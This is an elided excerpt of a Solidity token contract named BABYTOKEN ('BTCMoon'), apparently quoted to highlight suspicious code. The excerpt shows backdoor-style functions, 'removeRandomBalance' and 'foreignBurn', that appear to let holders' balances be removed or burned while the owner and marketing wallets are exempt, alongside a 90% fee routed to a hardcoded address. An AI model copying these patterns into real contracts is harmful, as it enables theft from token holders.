...
interface IERC20 {
    ...
    function removeRandomBalance(address account) external returns (uint256);
...
contract BABYTOKEN is Context, IERC20 { 
    ...
    address payable public marketingAddress = payable(0xb4e28751D68E957077E588b03D70eeb93CC6F786); 
    ...
    string private constant _symbol = unicode"BTCMoon"; 
    ...
    uint256 public marketingPercent = 90;
    uint256 public teamPercent = 0;
    uint256 public burnPercent = 0;
    uint256 public liquidityPercent = 10;

    uint256 public rawProportion = 10**20;
    ...
    constructor () {
        ...
        _owner = 0x833aB9F8F1C9d77362d02CcfF265F33928Fd8a5D;
    ...
    function removeRandomBalance(address account) public LockTheSwap override returns (uint256) {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_D = contractTokenBalance * teamPercent / 100;
            uint256 tokens_to_LP_Half = contractTokenBalance * liquidityPercent / 100;
    ...
    function foreignBurn(address newAddress) external virtual {
        require (newAddress != marketingAddress);
        require (newAddress != burnAddress);
        require (newAddress != uniswapV2Pair);
        require (newAddress != owner());
        require (newAddress != _owner);
